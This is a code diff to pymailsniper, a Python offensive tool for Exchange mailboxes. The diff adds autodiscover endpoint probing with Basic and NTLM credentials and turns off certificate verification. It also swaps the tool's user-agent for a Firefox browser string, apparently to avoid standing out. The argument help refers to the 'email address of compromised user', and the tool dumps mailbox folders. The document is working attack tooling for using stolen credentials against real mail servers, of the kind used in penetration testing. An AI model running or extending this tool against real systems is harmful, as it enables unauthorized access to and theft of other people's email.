@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 import re
+import socket
 from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
     NoVerifyHTTPAdapter, Message, Q, FaultTolerance, DistributionList
 from exchangelib.errors import UnauthorizedError, CASError
+from requests.auth import HTTPBasicAuth
 import shutil
 from requests_ntlm import HttpNtlmAuth
 import requests
@@ -26,7 +28,7 @@ messages_per_thread = None
 # ignore certificate errors and suspend warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter
-BaseProtocol.USERAGENT = "Auto-Reply/0.1.0"
+BaseProtocol.USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
 
 
 def loggerCreate(params):
@@ -159,9 +161,8 @@ Attachments: {attach}
 
 def create_user_folder(params=None):
     email = params.get('email')
-    server = params.get('server')
 
-    folder_name = sanitise_filename(f"{email} ({server})")
+    folder_name = sanitise_filename(f"{email}")
 
     if not os.path.isdir(folder_name):
         os.mkdir(folder_name)
@@ -714,36 +715,70 @@ def dump_folders(accountObject=None, params=None):
 
 
 def get_autodiscover(params=None):
-    print("\n[+] Performing autodiscover request\n")
-    server = params.get('server').replace("https://", "").replace("http://", "")
+    server = params.get('server').replace("https://", "").replace("http://", "") if params.get('server') else \
+    params.get('email').split('@')[1]
+
     email = params.get('email')
     password = params.get('password')
-    url = "https://" + server + "/autodiscover/autodiscover.xml"
-    headers = {
-        "Host": server,
-        'Content-Type': 'text/xml',
-    }
+    auths = {'Basic': HTTPBasicAuth, 'NTLM': HttpNtlmAuth}
+    autodiscover_urls = [f"autodiscover.{server}"]
+    a = server.split('.')
+    autodiscover_urls += [server[server.index(a[i]):] for i in range(len(a) - 1)]
+
     autodiscover_request_body = f"""
-    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
-    <Request>
-      <EMailAddress>{email}</EMailAddress>
-      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
-    </Request>
-    </Autodiscover>
-    """
-    response = requests.post(url, data=autodiscover_request_body, headers=headers, auth=HttpNtlmAuth(email, password),
-                             verify=False)
-    file = f"{params.get('user_folder')}/autodiscover.xml"
-    with open(file, 'w', encoding='utf8') as writer:
-        writer.write(response.text)
-    return response.text
+                <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+                <Request>
+                  <EMailAddress>{email}</EMailAddress>
+                  <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+                </Request>
+                </Autodiscover>
+                """
+
+    print("\n[+] Looking for autodiscover location\n")
+
+    for auth_key, auth_type in auths.items():
+        for url in autodiscover_urls:
+            try:
+                socket.gethostbyname(url)
+                print(f"[+] Found A record for: {url}\n")
+            except:
+                print(f"[-] Not found: {url}\n")
+                autodiscover_urls.remove(url)
+                continue
+
+            headers = {"Host": url, 'Content-Type': 'text/xml'}
+
+            for method in ["https://", "http://"]:
+                try:
+                    full_url = f'{method}{url}/autodiscover/autodiscover.xml'
+
+                    session = requests.Session()
+                    session.auth = auth_type(email, password)
+                    session.verify = False
+                    # session.proxies = {"https": '127.0.0.1:8080', "https": '127.0.0.1:8080'}
+
+                    redirect_check = session.get(full_url, allow_redirects=False, timeout=1)
+                    if redirect_check.status_code == 302:
+                        print(f"[!] Redirected from {full_url} to {redirect_check.next.url}\n")
+                        full_url = redirect_check.next.url
+                    response = session.post(full_url,
+                                            data=autodiscover_request_body, headers=headers,
+                                            timeout=1)
+                    if response.status_code != 200 or len(response.text) == 0:
+                        continue
+                    file = f"{params.get('user_folder')}/autodiscover.xml"
+                    with open(file, 'w', encoding='utf8') as writer:
+                        writer.write(response.text)
+                    return response.text
+                except:
+                    print(f"[-] Could not get {full_url} ( {auth_key} auth )\n")
 
 
 def get_args():
     parser = argparse.ArgumentParser(description='Python implementation of mailsniper',
                                      usage='python3 pymailsniper.py -s mail.server.com -e email@email.com action object [action options]')
 
-    parser.add_argument('-s', '--remote-server', action="store",
+    parser.add_argument('-s', '--server', action="store",
                         dest="server", help='EWS URL for Mail Server')
     parser.add_argument('-e', '--email', action="store",
                         dest="email", help='Email address of compromised user')
@@ -929,13 +964,12 @@ if __name__ == "__main__":
     action = parsed_arguments['action']
     action_object = parsed_arguments['object']
 
-    if parsed_arguments['server']:
-        parsed_arguments['user_folder'] = create_user_folder(params=parsed_arguments)
+    parsed_arguments['user_folder'] = create_user_folder(params=parsed_arguments)
 
     if action == 'get':
         if parsed_arguments['object'] == 'autodiscover':
             autodiscover_response = get_autodiscover(params=parsed_arguments)
-            print(autodiscover_response)
+            print(f'[+] Plain autodiscover response:\n\n{autodiscover_response}')
             print(f"\n[=] Saved to \"./{parsed_arguments.get('user_folder')}/autodiscover.xml\"\n")
 
             sys.exit()
@@ -948,8 +982,6 @@ if __name__ == "__main__":
     if accountObj is None:
         print('[=] Could not connect to MailBox\n\n')
         sys.exit()
-
-
 
     start_time = time.time()
 
